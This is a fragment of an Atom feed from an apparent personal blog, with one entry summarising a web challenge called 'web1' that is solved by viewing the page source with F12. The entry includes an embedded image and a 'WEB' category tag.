    <summary type="html">&lt;p&gt;web1.&lt;img src=&quot;https://img-blog.csdnimg.cn/20210304135636453.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l1bndhbmcwNDIx,size_16,color_FFFFFF,t_70&quot; alt=&quot;在这里插入图片描述&quot;&gt;&lt;br&gt;F12查看源代码直接搞定&lt;/p&gt;</summary>
    
    
    
    <category term="WEB" scheme="http://yun421.top/categories/WEB/"/>
    
    
  </entry>
  
</feed>
